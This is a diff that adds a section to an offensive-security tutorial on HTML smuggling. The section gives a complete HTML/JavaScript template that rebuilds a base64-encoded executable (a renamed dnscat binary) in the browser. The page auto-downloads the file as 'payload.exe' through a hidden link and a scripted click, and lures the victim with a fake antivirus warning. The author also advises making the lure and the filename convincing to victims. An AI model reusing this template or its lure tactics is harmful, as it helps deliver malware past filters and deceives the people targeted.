@@ -72,4 +72,61 @@ If we load that page we should see the Microsoft Login Page! text and it should 
 ## Malicious Smuggle Test
 Now that we have seen benign usage of some ways to do HTML Smuggling, lets try with an actual binary. For this I am using a renamed version of dnscat because I know Defender blocks it as malicious. The dnscat executable I have renamed to leroy3.exe. 
 ![](smuggle1.png)
+First, we need to base64 encode it because the binary can’t directly be copied as a buffer because it contains various characters that might break the buffer and full file may not be copied that way. We use the base64 tool in Kali:
+```
+Cat leroy.exe | base64
+```
+![](smuggle2.png)
+It is a fairly long output. The issue with this is there is “enter” or carriage returns and its not all in one single line. In order to supply this into our blob as a buffer, we need a single string with no enters. To do this we go [here](https://base64.guru/converter/encode/file) and upload our file and convert it to base64 as plain text-just the base64 value:
+![](smuggle3.png)
+The goal is to create a JavaScript Blob and a script that will allow us as an attacker to make our code recompile as an EXE file at the victim end. This approach can bypass many content filters and firewalls since the data is travelling as a string text. Here is the template we can use, just replace var binary='<value>' with the actual Base64 string value
+```
+<html>
+<body>
+<h1>Malware Detected!</h1>
+<p>Alert! Run the downloaded script for anti-virus scan!</p>
+<script>
+function b64toarray(base64) {
+        var bin_string = window.atob(base64);
+        var len = bin_string.length;  
+        var bytes = new Uint8Array( len );
+        for (var i = 0; i < len; i++)
+        {
+                bytes[i] = bin_string.charCodeAt(i);
+        }
+        return bytes.buffer;
+}
+var binary ='<value>'
+
+var data = b64toarray(binary);
+var blob = new Blob([data], {type: 'octet/stream'});
+var payloadfilename = 'payload.exe';
+
+var a = document.createElement('a');
+document.body.appendChild(a);
+a.style = 'display: none'; 
+var url = window.URL.createObjectURL(blob);
+a.href = url;
+a.download = payloadfilename;
+a.click();
+window.URL.revokeObjectURL(url);
+</script>
+</body>
+</html>
+```
+First, let’s see the results of it, then we can break down whats going on in the script. So when someone gets this HTML and opens it, it will automatically craft the executable from the base64 content and then download it without anyone needing to click a link. Some peoples browsers may simply download without a prompt, so keep that in mind. 
+![](smuggle4.png)
+There we see it automatically starts the download upon me visiting the page, because of the click() function, and a message stating that whatever was downloaded needs to be run to scan for viruses (of course be more crafty than this). I allow the download and then we can run strings on it to verify it is indeed the dnscat executable. 
+![](smuggle5.png)
+![](smuggle6.png)
+We do see code above indicating it is indeed dnscat. Lets break down what the code is doing:
+1.	Function b64toarray: Takes input of our base64 encoded binary file and converts it into a buffer array. This is necessary as the “Blob()” function takes input from a buffer array as the first parameter.
+2.	Variable binary: This variable contains the base64 string of our binary and is used to provide function b64toarray input. Replace Value with our base64 encoded string.
+3.	Variable blob: Holds the blob we just created and takes two inputs as explained above. Here, since we are providing a binary as input the MIME type becomes octet/stream
+4.	Variable payloadfilename: It is the name that will be given to our binary once it is downloaded on the victim’s machine. This is what you would want to name to be convincing to the victim.
+5.	CreateElement: A DOM function that can create new HTML elements with the help of JavaScript. For example to create a new para in HTML we type: <p>New Para</p>
+6.	style: We are using the styling ‘display: none’ to be more discreet so that a tag isn’t visible on the output.
+7.	createObjectURL(): A DOM function that can return a DOMString containing a value that represents the URL of an object. This object can be a file, media source or in our case blob. It is very necessary as the a.download works on valid URLs only. For our payload blob to be downloaded on the victim, we need to supply the a.download element with a valid URL which this function returns.
+8.	click(): Is what will trigger this anchor tag to automatically run. It simulates as if a user has actually clicked on the link provided by the href tag.
+
 
